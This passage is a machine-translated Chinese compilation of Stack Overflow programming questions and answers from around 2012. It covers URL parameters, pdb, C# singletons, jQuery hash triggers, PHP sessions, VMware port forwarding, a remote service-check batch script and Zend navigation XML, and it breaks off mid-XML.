[您可以使用我在这里找到](http://papermashup.com/read-url-get-variables-withjavascript/)的这个 JS 函数获取 URL 参数：

```
function getUrlVars() {
    var vars = {};
    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
        vars[key] = value;
    });
    return vars;
} 
```

然后 *add use `?lightbox=1`eg`www.example.com?lightbox=1`并使用上述函数读取它：

```
if(getUrlVars()["lightbox"]=="1"){
    //...
} 
```

*要添加参数，您可以：

*   更改链接 href 属性`element.href = "http://www.newURL.com?param=1";`并等待用户单击它们
*   重定向到新位置`window.location.href = "http://www.newURL.com?param=1";`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T03:36:19.503

我相信这是您所追求的粗略代码：

```
<script type="text/javascript">
    document.location="http://example.com/index.php?noLightBox=1";
</script> 
```

然后在 index.php 上，您需要以下内容：

```
<?php 
function isset_or(&$check, $alternate = NULL) 
{ 
    return (isset($check)) ? (empty($check) ? $alternate : $check) : $alternate; 
} 

function getGETPOST($var) 
{ 
       return isset_or($_GET[$var],isset_or($_POST[$var],"Empty")); 
} 
?> 
```

例子：

```
if(getGETPOST('noLightBox') != 1) {
// Code to display the light box comes here.
}
// Else normal page code 
```

希望这有帮助！来源：[http](http://php.net/manual/en/function.isset.php) ://php.net/manual/en/function.isset.php & W3School 的 PHP 教程

# python - 中断（暂停）在 pdb 中运行 Python 程序？

> ID：10239760
> 
> 赞同：28
> 
> 时间：2012-04-20T03:15:24.780
> 
> 标签：python, debugging, pdb

在 gdb 中，您可以通过抄送中断（暂停）程序并恢复。

你可以在 pdb 中做到这一点吗？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2016-09-13T20:04:11.487

不，python2 的 pdb 不支持这一点，但您将此代码添加到程序中作为解决方法：

```
def debug_signal_handler(signal, frame):
    import pdb
    pdb.set_trace()
import signal
signal.signal(signal.SIGINT, debug_signal_handler) 
```

相关问题：

*   [显示正在运行的 Python 应用程序的堆栈跟踪](https://stackoverflow.com/questions/132058/showing-the-stack-trace-from-a-running-python-application)
*   [输入带有终止信号的 pdb](https://stackoverflow.com/questions/32162674/enter-pdb-with-kill-signal)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-04-20T03:30:02.030

根据[这个错误报告](http://bugs.python.org/issue7245)，它可能会在 Python 3 中得到修复。

在 2.x 中，Ctrl-C 将抛出一个 KeyboardInterrupt，它通常不被程序处理，并将调试器置于“事后”模式。你不能从中断的地方继续。

我不知道是否有其他方法可以执行您所描述的操作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-11-29T11:13:22.003

根据 jwd 的回答中的预测，这现在似乎得到了支持。

在 Python 3.8 中，按下 Ctrl+C 会暂停执行，之后您可以单步执行代码并使用此处列出的命令向上/向下导航执行堆栈：

[如何单步调试 Python 代码以帮助调试问题？](https://stackoverflow.com/questions/4929251/how-to-step-through-python-code-to-help-debug-issues/4929267#4929267)

# java - 使用 Dropbox 服务器验证本地计算机中的文件是最新的

> ID：10239763
> 
> 赞同：0
> 
> 时间：2012-04-20T03:15:38.767
> 
> 标签：java, dropbox, dropbox-api

我正在开发一个 java 应用程序。我想向我的应用程序添加功能，以验证本地 Dropbox 文件夹中的文件与 Dropbox 服务器中的文件是否匹配。我如何检查我的本地保管箱文件夹是最新的？

我在 Dropbox api 上找到了这个。[https://www.dropbox.com/developers/reference/api#delta](https://www.dropbox.com/developers/reference/api#delta)

但不知道如何使用它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T18:09:08.483

/delta 调用是使用 Dropbox 使您的应用程序状态保持最新的最佳方式（只要您对多个文件或文件夹感兴趣。）您已经找到了文档： [https://www. dropbox.com/developers/reference/api#delta](https://www.dropbox.com/developers/reference/api#delta)

还有两个帖子，其中包含测试期间的一些注释： [https://www.dropbox.com/developers/announcements/15](https://www.dropbox.com/developers/announcements/15) [https://www.dropbox.com/developers/announcements/16](https://www.dropbox.com/developers/announcements/16)

您可以在此处找到 Java SDK： [https](https://www.dropbox.com/developers/reference/sdk) : //www.dropbox.com/developers/reference/sdk 在 Java SDK 中，您会找到一个使用 /delta 的工作示例应用程序，名为“SearchCache”。

虽然上述资源会更好地解释 /delta，但基本思想是，当您第一次调用它时，您会获得 Dropbox 帐户的状态，并且在所有后续调用中，您都会获得所需内容的“delta”了解最新信息。

# c# - 如何在 C# 中创建一个完美的 Singleton 类？

> ID：10239765
> 
> 赞同：3
> 
> 时间：2012-04-20T03:16:06.223
> 
> 标签：c#, model-view-controller, design-patterns, singleton

我想用 Singleton 类存储一些数据。据我研究，单例类只能实例化一次。但这对我不起作用。有人可以更正我的代码：

```
public class MvcApplication : System.Web.HttpApplication
    {
        Singleton clientsessionidinstance = Singleton.GetInstance();
        public static void RegisterGlobalFilters(GlobalFilterCollection filters)
        {
            filters.Add(new HandleErrorAttribute());
        }

        public static void RegisterRoutes(RouteCollection routes)
        {
            routes.IgnoreRoute("{resource}.axd/{*pathInfo}");
            routes.MapRoute(
                "Default", // Route name
                "{controller}/{action}/{id}", // URL with parameters
                new { controller = "Home", action = "Index", id = UrlParameter.Optional },
                new string[] { "MVCPrj.Controllers" }
            );
        }

        protected void Application_Start()
        {
            AreaRegistration.RegisterAllAreas();

            RegisterGlobalFilters(GlobalFilters.Filters);
            RegisterRoutes(RouteTable.Routes);

            LOGICcLASSES.Logic.Auth ca = new LOGICcLASSES.Logic.Auth();
            clientsessionidinstance = Singleton.GetInstance();
            clientsessionidinstance.ClientSessionID = ca.Login(new LOGICcLASSES.Entities.ClientAuthentication()
            {
                IP = HttpContext.Current.Request.ServerVariables["REMOTE_ADDR"],
                UserName = ConfigurationManager.AppSettings["ClientUserName"],
                Password = ConfigurationManager.AppSettings["ClientPassword"]
            });
        }

        protected void Application_AcquireRequestState(object sender, EventArgs e)
        {
            if (System.Web.HttpContext.Current.Session != null)
            {
                if (!string.IsNullOrEmpty(clientsessionidinstance.ClientSessionID))
                {
                    CurrentUserSession.Store<string>("ClientSessionID", clientsessionidinstance.ClientSessionID);
                }
            }
        }
    } 
```

所以目标是这样的，@`Application_Start`我要登录账号。然后我应该将返回字符串保存在`HttpContext.Current.Session`.
不幸的是，我无法进入`HttpContext.Current.Session`内部`Application_Start`，但可以在`Application_AcquireRequestState`.
我可以使用一个变量来保存返回的字符串，然后在 中使用它的值`Application_AcquireRequestState`，但最大的问题是，页面加载了吗？两次，所以如果我将使用一个变量，它将`null`在第二次加载时变为，但`Application_Start`仍会启动一次。
所以我想出了使用单例类，但我仍然在第二次加载时得到空值。

单例类：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;

namespace MVCPrj.Areas.WebPage.Logic
{
    public class Singleton
    {
        private static Singleton instance;

        private Singleton() { }

        public static Singleton GetInstance()
        {
            lock (typeof(Singleton))
            {
                instance = new Singleton();
            }
            return instance;
        }

        private string _ClientSessionID;
        public string ClientSessionID
        {
            get { return _ClientSessionID; }
            set { _ClientSessionID = value; }
        }
    }
} 
```

**编辑**

[阅读Singleton](http://geekswithblogs.net/BlackRabbitCoder/archive/2010/05/19/c-system.lazylttgt-and-the-singleton-design-pattern.aspx)后，此代码对我有用

```
public class Singleton
{
    private static readonly object _mutex = new object();
    private static volatile Singleton _instance = null;
    private Singleton() { }

    public static Singleton Instance
    {
        get
        {
            if (_instance == null)
            {
                lock (_mutex)
                {
                    if (_instance == null)
                    {
                        _instance = new Singleton();
                    }
                }
            }
            return _instance;
        }
    }

    private string _ClientSessionID;
    public string ClientSessionID
    {
        get { return _ClientSessionID; }
        set { _ClientSessionID = value; }
    }
} 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-20T03:22:21.160

如果您使用的是 .NET4，“完美的单例”通常最好使用[System.Lazy](http://geekswithblogs.net/BlackRabbitCoder/archive/2010/05/19/c-system.lazylttgt-and-the-singleton-design-pattern.aspx)来实现。

另请参阅[此网页](http://csharpindepth.com/articles/general/singleton.aspx)，了解 C# 中许多不同的单例模式及其各种优缺点的描述。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T03:19:34.803

```
public static Singleton GetInstance()
    {
        lock (typeof(Singleton))
        {
            instance = new Singleton();
        }
        return instance;
    } 
```

如果成员实例为空，您只需要创建一个新实例。你似乎一直在这样做。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T03:28:48.400

我一直为我的单身人士使用这个通用基类：

```
public class SingletonBase<T> where T : class
{
    static SingletonBase()
    {
    }

    public static readonly T Instance =
        typeof(T).InvokeMember(typeof(T).Name,
                                BindingFlags.CreateInstance |
                                BindingFlags.Instance |
                                BindingFlags.Public |
                                BindingFlags.NonPublic,
                                null, null, null) as T;
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-20T03:49:01.633

```
public sealed class Singleton
{
    public static readonly Singleton Instance =new Singleton();
    private Singleton(){}
}//end 
```

这是我见过的最好的单身狗。

它很简单，但不使用锁是线程安全的。

您还可以将“**实例**”作为具有“ **_instance** ”字段的属性。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-08-16T11:58:56.167

我使用这样的单例，我没有问题：

```
public sealed class Settings
{
    private static readonly Lazy<Settings> lazy =
    new Lazy<Settings>(() => new Settings());

    public static Settings Instance { get { return lazy.Value; } }

    private Settings()
    {
        _fileName = "Settings.ini";
    }
....
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2014-10-10T04:44:02.503

**辛格尔顿**

```
using System;

public class Singleton
{
   private static Singleton instance;

   private Singleton() {}

   public static Singleton Instance
   {
      get 
      {
         if (instance == null)
         {
            instance = new Singleton();
         }
         return instance;
      }
   }
} 
```

**静态初始化**

```
 public sealed class Singleton
{
   private static readonly Singleton instance = new Singleton();

   private Singleton(){}

   public static Singleton Instance
   {
      get 
      {
         return instance; 
      }
   }
} 
```

**多线程单例**

```
 using System;

public sealed class Singleton
{
   private static volatile Singleton instance;
   private static object syncRoot = new Object();

   private Singleton() {}

   public static Singleton Instance
   {
      get 
      {
         if (instance == null) 
         {
            lock (syncRoot) 
            {
               if (instance == null) 
                  instance = new Singleton();
            }
         }

         return instance;
      }
   }
} 
```

资料来源：[在 C# 中实现单例](http://msdn.microsoft.com/en-au/library/ff650316.aspx)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-04-20T03:28:04.497

实际上，如果它的 CTOR 是默认值（无参数），则可以将 new 放在变量定义中：

```
public sealed class Singleton {
   public readonly Singleton Instance = new Singleton();
   ...
} 
```

请参阅[探索单例设计模式](http://msdn.microsoft.com/en-us/library/ee817670.aspx)

# jquery - Jquery，当哈希在url中时激活脚本

> ID：10239766
> 
> 赞同：1
> 
> 时间：2012-04-20T03:16:27.877
> 
> 标签：jquery, events, hash, triggers

因此，我有一些图像绝对位于设置为隐藏的页面上方，当您单击触发显示它们的事件的相应链接时，显示继承。

现在，这就是我的问题所在。假设我为图像分配了“示例”的 ID - 当有人进入带有井号标签 #example 的网站或点击带有井号标签 #example 的链接时，有什么办法吗？ url，该事件是否会针对具有相同 ID 的图像触发？我真的很难过这个

我一直在使用的是这样的：

```
$("#activate1").click(function () {
$("#flyer1").css("display", "inherit"); 
```

});

效果很好，但现在我必须每周添加传单，这意味着我需要更改它，除非我想为每个独特的案例编写上面的代码。但最重要的是，我现在还必须通过链接将它们发送给人们，因此现在必须在他们单击链接时触发脚本 - 我认为解决这个问题的最佳方法可能是实现哈希标签触发器

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T03:18:21.633

```
$(function() {

    $('#example').on('click', function() {
        alert('was triggered');
    });

    $(window.location.hash).trigger('click');

}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T04:11:25.290

要激活页面中包含井号标签的所有链接而不编码任何特定名称，您可以执行以下操作：

```
$('a[href*="#"]').on('click', function(e) {
    var match = this.href.match(/#[^#]+$/);
    if (match) {
        // trigger a click on the object that has an id 
        // matching the hash value in the link
        $(match[0]).trigger('click');
        return(false);   // no default processing for the link
    }
}); 
```

要处理初始链接上的哈希标记，您可以运行以下代码：

```
$(document).ready(function() {
    if (window.location.hash && window.location.hash != "#") {
        $(window.location.hash).trigger('click');
    }
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T03:42:33.020

插件是你的朋友。快速的 Google 显示 Ben Alman 的[jQuery BBQ](http://benalman.com/projects/jquery-bbq-plugin/)库可以为您提供帮助！

（无关：名称很酷的 jQuery 库是您未来项目的绝佳补充！）

# c - C初学者：如何在C中搜索文件中的特定单词（逐行）

> ID：10239771
> 
> 赞同：5
> 
> 时间：2012-04-20T03:17:21.363
> 
> 标签：c, file, while-loop, strcmp

我需要逐行搜索文件中的两个特定单词，如果它们存在，则打印“找到！”。

这是 file.txt（有四列）

```
bill gates 62bill microsoft 
beyonce knowles 300mill entertainment 
my name -$9000 student 
```

以下是我的想法，但它似乎不起作用

```
char firstname[];
char lastname[];
char string_0[256];

file = fopen("file.txt","r+");

while((fgets(string_0,256,file)) != NULL) {

  //scans the line then sets 1st and 2nd word to those variables
  fscanf(file,"%s %s",&firstname, &lastname);

  if(strcmp(firstname,"beyonce")==0 && strcmp(lastname,"knowles")==0){
    printf("A match has been found");
  }
}

fclose(file); 
```

请帮忙。可能是指针没有移动到while循环中的下一行吗？如果是这样，我该如何解决？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T03:19:43.740

而不是在你已经用 读取它之后调用`fscanf`它`file`，`fgets`你应该调用你在调用中将数据复制到`sscanf`的变量。`string_0``fgets`

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-20T03:20:50.100

一种方法是使用该`fget`函数并在文本中查找子字符串。尝试这样的事情：

```
int main(int argc, char **argv)
{
    FILE *fp=fopen(argv[1],"r");
    char tmp[256]={0x0};
    while(fp && fget(tmp, sizeof(tmp), fp))
    {
        if (strstr(tmp, "word1"))
            printf("%s", tmp);
        else if (strstr(tmp, "word2"))
            printf("%s", tmp);
    }
    if(fp) fclose(fp);
    return 0;
} 
```

# security - RequestFactory 生成的 id 有多安全？

> ID：10239772
> 
> 赞同：0
> 
> 时间：2012-04-20T03:17:47.533
> 
> 标签：security, gwt, requestfactory

我对 RequestFactory 的内部结构有一定的了解，但现在我正在围绕它实施安全策略，我没有看到太多关于这个主题的文献。我对 RequestFactory 正在使用的客户端代理 ID 的安全性特别感兴趣。例如，我的数据库中一个对象的 id 可能是`32`，但 RequestFactory 可能会将该 id 称为`Qkjnsd89urknasj3`或其他东西。

有人凭空生成我的一个对象的有效 ID 有多难？这些 id 是如何产生的？

任何信息表示赞赏，谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T04:05:34.530

它们不安全，它们是 base64 编码的。这是为了确保无论您在密钥中使用哪种数据，它都可以将其转换为真正的密钥。

因此，不允许仅基于实例的 ID 自由和开放地访问对象，而是有某种逻辑来检查当前用户是否可以查看记录。或者使 ID 不可预测，并且 ID 空间足够大，以至于随机猜测会让你无处可去。但即便如此，当 RF 引用它们时，这些密钥也会被 base64 编码。

# playframework-2.0 - 使用 Play 启动延迟的 HTTP 响应

> ID：10239787
> 
> 赞同：0
> 
> 时间：2012-04-20T03:20:22.860
> 
> 标签：playframework-2.0

我有一个 .net 类，它向正在运行的控制器发出 HTTP 请求，但我的控制器必须让请求等待，一段时间后我必须对请求做出响应。我尝试使用 Promise 但无法弄清楚如何实现这一点需要帮助来解决这个问题......

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T13:28:51.073

假设您想在 Play 1.2.x 中执行此操作，您将使用该`await`函数。例如，要接收请求，等待 30 秒，然后响应，您会这样做

```
public static void delay30() {
    await("30s");
    renderText("a-response");
} 
```

您可以使用任何渲染方法，renderText 只是一个示例。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T09:16:41.287

等待通常不是最好的主意。在这种情况下，您可能想要做的是创建一个 Akka actor，它会每隔一段时间被[调度程序](http://doc.akka.io/docs/akka/2.0.1/scala/scheduler.html)ping通。当它收到该 ping 消息时，它会检查您正在寻找的条件是否存在，并会通知所有注册对该事件感兴趣的 actor-refs。

当您通过 ask 模式向 akka Actor 发送消息时，该消息的发送者是支持 Future 的 Actor，一旦向该支持 Actor 发送消息，就会实现。

Play 2.0 有一种[将 Akka Future 转变为 Play Promise](http://www.playframework.org/documentation/2.0/ScalaAkka)的简单方法。有了它，使用 Akka 和 Play 进行异步编程！

所以总而言之，你的 Actor 需要对两条消息做出反应：RegisterListener Ping

RegisterListener 是您使用 ask 模式发送的消息，actor 将需要保留对该侦听器的发送者的引用，以便在满足条件时通知它。

# asp.net - 将日期/时间插入 Access 数据库

> ID：10239789
> 
> 赞同：6
> 
> 时间：2012-04-20T03:20:28.487
> 
> 标签：asp.net, sql, vb.net, ms-access

我正在使用 ASP.NET/VB 并尝试将日期和时间插入 Access 日期/时间字段，但出现错误（标准表达式中的数据类型不匹配）。这是我的代码的简化版本：

```
Dim myDate As Date = Now()
Dim myIns1 As New OleDbCommand("INSERT INTO tableCourse (date_submitted) VALUES (?)", myConn)
myIns1.Parameters.AddWithValue("@myDate", myDate)
myIns1.ExecuteNonQuery() 
```

不知道为什么我会收到错误，也不确定这是否是插入当前日期的正确方法。从查看其他类似问题来看，似乎有几种不同的方法可以做到这一点，但我的技术知识有点有限，所以我很难弄清楚（换句话说，用我知道的技术术语破译答案什么都没有）。

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T03:40:27.683

您可以完全跳过该参数，只需将 NOW 函数直接写入查询。

```
Dim myIns1 As New OleDbCommand("INSERT INTO tableCourse (date_submitted) VALUES (NOW())", myConn)
myIns1.ExecuteNonQuery() 
```

~~这个答案（上面那个）可能是更好的解决方案，但是原始代码不起作用的原因是因为参数没有命名。你可以试试这个：~~

 ~~```
Dim myDate As Date = Date.Now
Dim myIns1 As New OleDbCommand("INSERT INTO tableCourse (date_submitted) VALUES (@myDate)", myConn)
myIns1.Parameters.AddWithValue("@myDate", myDate)
myIns1.ExecuteNonQuery() 
```~~  ~~* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-20T03:24:47.700

尝试改变

```
Dim myDate As Date = Now() 
```

至

```
Dim myDate As DateTime = Now() 
```

MS Access 不提供 DATE 数据类型，仅提供 DATETIME。~~

# android - 在我的服务中从 LocationManager 请求更新。这是个好主意吗？

> ID：10239799
> 
> 赞同：0
> 
> 时间：2012-04-20T03:22:00.243
> 
> 标签：android, gps

这是我的想法.. 现在为了节省电池 - 我使用了一些“奇特”的逻辑，我的服务每 5 分钟由 Alarm 启动，我请求 GPS 位置更新`LocationManager`并等待长达 1 分钟以获得最准确的 FIX。

这一切都很好，但在 5 分钟不活动后，GPS 下次可能需要一段时间才能“预热”。

我的想法是监控设备何时连接到充电器以及是否连接 - 启动另一个虚拟服务，该服务将获取 LocationManager 并请求更新，这将在充电器连接时为我保持 GPS 开启。这样，当我的“真正”服务每 5 分钟启动一次时，GPS 数据就会立即准备就绪。

我是否正确理解 LocationManager 只要听众数 >0 就会保持 GPS 开启？我的想法是好的还是这种方法有缺点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T04:15:45.613

我能想到的一个缺点是，当手机连接到充电器时，通常没有必要从 GPS 请求更新，因为在大多数情况下，手机在建筑物内充电，这意味着没有 GPS 信号。

# javascript - 分享到 Facebook 时如何添加类似叠加图像的“播放按钮”？

> ID：10239803
> 
> 赞同：0
> 
> 时间：2012-04-20T03:22:53.940
> 
> 标签：javascript, jquery, ruby-on-rails, image-processing, overlay

首先，这与以下问题不同：[如何将图像放在另一个图像之上？](https://stackoverflow.com/questions/785458/how-to-place-an-image-over-another)

我想知道的是如何将播放按钮图像叠加在另一个现有图像之上，并将其分享到 Facebook。我看到的唯一方法是创建一个包含叠加层的新图像。我想知道：

1.  如果除了创建新图像之外还有其他方法可以做到这一点。理想情况下，我不想将图像存储到我的服务器。
2.  如果这是唯一的方法，那么最简单的方法是什么？任何库来创建这种类型的图像？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T03:41:49.793

Facebook 从页面中获取图像，因此如果您希望*带有*叠加播放按钮的图像显示在 Facebook 预览中，则必须生成该图像。

关于合并 2 个图像，我确信有大量关于使用 imagemagick / rmagick 组合图像的信息

*   [http://mikewilliamson.wordpress.com/2010/05/18/image-overlays-with-rmagick-and-rails/](http://mikewilliamson.wordpress.com/2010/05/18/image-overlays-with-rmagick-and-rails/)
*   [Rails 3/回形针/ imagemagick - 合并两个图像](https://stackoverflow.com/questions/7137342/rails-3-paperclip-imagemagick-merging-two-images)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-08-28T16:12:15.527

您可以使用 adobe photoshop 在图像上添加播放按钮，例如 facebook 播放按钮。观看此视频，您将了解如何将其添加到图像上。 [http://mefmor.blogspot.com/2014/08/how-to-add-facebook-play-button-in-your.html](http://mefmor.blogspot.com/2014/08/how-to-add-facebook-play-button-in-your.html)

# testing - Gnuplot 绘图 - 缺失线

> ID：10239807
> 
> 赞同：0
> 
> 时间：2012-04-20T03:23:40.830
> 
> 标签：testing, graph, eval, gnuplot

嘿，我有以下 gnuplot 脚本：

```
 #!/usr/bin/gnuplot

  reset
  set term postscript
  set output "OptimumCoalesce.ps"
  set grid
  set key box linestyle 5
    set key spacing 1.5 

    set key left
     ...
     set xrange[1:100000]
     set size 0.6,0.6
    set logscale x
    plot "Optimal_coalescing.txt" using 1:2 title "MultiDB" ls 1 with points 
```

对于数据

```
 1 35199.88863
    10 20926.1477502296
    100 15483.2186868687
    500 10017.4652892562
    1000 10497.8036730946 
```

但是 Gnuplot 没有绘制第一行！对于 1 ，它重复第 2 行的值。知道发生了什么吗？

# php - session_start() 每次都生成相同的会话 ID

> ID：10239808
> 
> 赞同：2
> 
> 时间：2012-04-20T03:23:53.877
> 
> 标签：php

我正在尝试实现简单的登录和注销机制。当用户登录时，我正在使用`session_start()`. 在用户注销时，我正在打电话

```
session_unset();
session_destroy(); 
```

但问题是下次注销后如果再次登录。`the session_id()`和以前一样。不管我做了多少`session_destroy()`，`session_id()`总是一样的。这是否意味着`session_destroy()`不工作？还是有其他原因？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T03:26:37.620

改变

```
session_unset(); 
session_destroy(); 
```

到

```
session_start(); 
session_destroy(); 
```

正如您的代码会话并没有真正被破坏。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-20T04:27:22.547

[http://php.net/session_destroy](http://php.net/session_destroy)

session_destroy() 基本上可以

```
$_SESSION = array(); 
```

但保持会话 cookie 和存储在其中的会话 ID 完好无损。您必须通过`setcookie()`调用手动取消设置 cookie，或使用`session_regenerate_id()`强制创建新 ID。

# android - 如何将我的 Android 设备连接到在 OSX 上运行的 VM？

> ID：10239818
> 
> 赞同：0
> 
> 时间：2012-04-20T03:25:12.737
> 
> 标签：android, debian, vmware

所以我在 OSX Lion 上的 VMWare 虚拟机中进行所有开发。虚拟机通过 NAT 共享我的 Mac 的互联网连接。我希望能够在我的 Android 手机（Samsung Galaxy Nexus）上查看我在我的 VM 中开发的内容，但我很难弄清楚如何做到这一点。

由于我的虚拟机实际上并不存在于我的网络上，并且我通过 172.xxx 地址访问它，因此我不能只在移动浏览器中点击标准的 192.xxx IP 来执行此操作。

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T04:34:38.933

您将需要使用端口转发让您的 Mac 将请求转发到某个端口到要处理的 VM。这是一个相当简单的过程（请注意，这些说明适用于 VMWare Fusion 4 - 版本 3 具有不同的文件位置）：

1.  cd /Library/Preferences/VMware\ Fusion/vmnet8
2.  编辑 nat.cnf - 找到 [incomingtcp] 部分并添加

    > 80 = 你的 172.xxx ip:80

    并保存文件。例如，我的是：

    > 80 = 172.16.65.130:80

3.  退出并重新启动 VMWare（您可以让它暂停并恢复您的 VM）

当您的网络服务器恢复到您的机器上时，您现在应该能够通过浏览到[http://localhost](http://localhost)在本地浏览器中访问网络服务器。要通过手机访问服务器，只需点击 Mac 的 IP（您的 192.xxx 地址），它就会将流量转发到网络服务器。

# ruby-on-rails - 如何在 mouseOver 事件上显示信息窗口

> ID：10239821
> 
> 赞同：0
> 
> 时间：2012-04-20T03:26:07.153
> 
> 标签：ruby-on-rails, ruby-on-rails-3, gmaps4rails

我正在升级旧的 Rails 2.1 应用程序并用 Gmaps4Rails gem 替换 google_maps 插件。到目前为止，转换非常简单。剩下的任务是以编程方式显示和隐藏我在地图旁边显示的地址列表的 mouseOver 上的标记信息窗口。

我的问题是如何获得标记的句柄以显示信息窗口？

我发现[了这个问题](https://stackoverflow.com/questions/6921456/show-infowindow-on-mouseover-event)，但它似乎处理了标记的 mouseOver 。本质上，我想使用地图外部元素的 mouseOver 事件来显示标记的信息窗口。

任何帮助表示赞赏。

这种行为似乎内置于 google_maps 插件中（据我所知）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T21:17:40.260

在 gmaps4rails 中没有内置的方法来实现这一点。但这里是相关的步骤：

1）在您的控制器中

```
 Foo.your_scope.to_gmaps4rails do |obj, marker|
   # Add any custom elements here
   marker.json { :id => obj.id }
 end 
```

这将添加 Gmaps.map.markers 数组中每个元素的 id。

2) 在你看来

html:

*   向每个侧元素添加一个具有相关对象 id 的属性

Javascript：

*   编写一个 js 函数，从它的 id 中检索一个标记（基本上，循环`Gmaps.map.markers`并检查每个元素的 id）

*   编写一个 js 函数来观察你的侧元素 mouseOver。在它的回调中，通过上面的函数找到相关的标记并最终触发：`foundMarker.infowindow.open(Gmaps.map.map, foundMarker.serviceObject)`

# service - 远程服务检查批处理文件无法正常工作

> ID：10239827
> 
> 赞同：0
> 
> 时间：2012-04-20T03:27:23.903
> 
> 标签：service, batch-file, psexec

这是我的伪：

```
Read from LIST
Ping to check if machine is awake | Report result
Check to see if SERVICE is running | Report result
  NO? Is it stopped?
    YES? Run it | Report result
    NO? Must not be installed, remote install please! | Report result 
```

这让我在这里发疯......我可以让这段代码的各个部分单独工作，但是当我将它组合成一个嵌套的 IF 结构时，如果机器没有，它会返回“网络错误”和“运行”服务正在运行...然后在该机器上进行手动检查显示它实际上仍处于停止状态。对于根本没有安装服务的机器也是如此。请告诉我我在哪里搞砸了..谢谢！

```
@echo off
echo.
echo.
cls
set SERVICE=MyServ

for /f %%i in (\\127.0.0.1\c$\list.txt) do call :DOIT %%i

:DOIT
echo Checking %SERVICE% on %1
@ECHO off
ping -n 2 -w 1000 %1 >trial.txt
find "Reply from" trial.txt>nul
if %ERRORLEVEL% == 1 (echo %1 Network Unresponsive>> "\\127.0.0.1\c$\list_report.txt")
if %ERRORLEVEL% == 0 (
    sc \\%1 query %SERVICE% | FIND "STATE" | FIND "RUNNING"
    if %ERRORLEVEL% == 0 (echo %1 Running>> "\\127.0.0.1\c$\list_report.txt")
    if not %ERRORLEVEL% == 0 (
        sc \\%1 query %SERVICE% | FIND "STATE" | FIND "STOPPED"
        if %ERRORLEVEL% == 0 (
            sc \\%1 start %SERVICE%
            echo %1 forced start>> "\\127.0.0.1\c$\list_report.txt""
        )
        if not %ERRORLEVEL% == 0 (
            xcopy /f /y "\\127.0.0.1\!\theAPP.exe" "\\%1\c$\temp\"
            \\127.0.0.1\!\psexec \\%1 -s -n 10 -d cmd /c "c:\temp\theAPP.exe"
            echo %1 Installed>> "\\127.0.0.1\c$\list_report.txt""
        )
    )
) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T16:28:17.820

这应该可以解决问题

```
 for /f %%i in (\\127.0.0.1\c$\list.txt) do call :DOIT %%i

:DOIT
    if not "%1"=="" (
        echo Checking %SERVICE% on %1
        echo.
        ping -n 2 -w 1000 %1 | find "Reply from" >nul
            if ERRORLEVEL  1 echo %1 Network Unresponsive>> \\127.0.0.1\c$\list_report.txt else (
                sc \\%1 query %SERVICE% | find "RUNNING" > nul
                    if ERRORLEVEL 1 (
                            sc \\%1 start %SERVICE% > nul
                            echo %1 Forced Start>> \\127.0.0.1\c$\list_report.txt                   
                    )  else  (
                        echo %1 Running>> \\127.0.0.1\c$\list_report.txt)
                    xcopy /f /y \\127.0.0.1\c$\text.txt \\%1\c$\temp\ > nul
                    \\127.0.0.1\c$\psexec \\%1 -s -n 10 -d cmd /c "type c:\temp\text.txt"
                    echo %1 Installed>> "\\127.0.0.1\c$\list_report.txt")
            )
    ) 
```

部分问题是您必须在脚本顶部测试 if not %1="" 。那是你得到错误文本的地方..

然后你有一些嵌套问题，所以我使用 ELSE 代替。

您必须将 text.txt 更改为您的 filename.exe（并省略“type”命令）

如果这能解决您的问题，请检查答案

仅供参考，您需要在远程计算机上具有管理员访问权限，以便您可以打开和关闭服务

# zend-framework - 使用xml文件的zend导航单级菜单

> ID：10239830
> 
> 赞同：0
> 
> 时间：2012-04-20T03:28:03.300
> 
> 标签：zend-framework, zend-navigation

使用 zend 框架，我如何创建单级菜单？

我遵循了一个教程，该人创建了一个两级下拉菜单。我只想搬家。我已经修改了navigation.xml 文件几次，它导致了一个致命错误。

我需要什么 xml 标记来将 home 的子级提升为父级菜单？因为我根本不需要主页按钮。

**期望的结果：**

> *   谁
> *   为什么
> *   什么
> *   扬声器
> *   资源

**目前的结果：**

> *   家
>     
>     
>     
>     • 谁
>     
>     
>     
>     • 什么
>     
>     
>     
>     • 什么时候
>     
>     
>     
>     • 为什么

**当前的 navigation.xml 文件：**

```
<?xml version="1.0" encoding="UTF-8" ?>
<configdata>
  <nav>
    <home>
      <label>Home</label>
      <controller>page</controller>
      <action>index</action>
      <module>default</module>
      <pages>
        <why>
          <label>why</label>
          <controller>page</controller>
          <action>why</action>
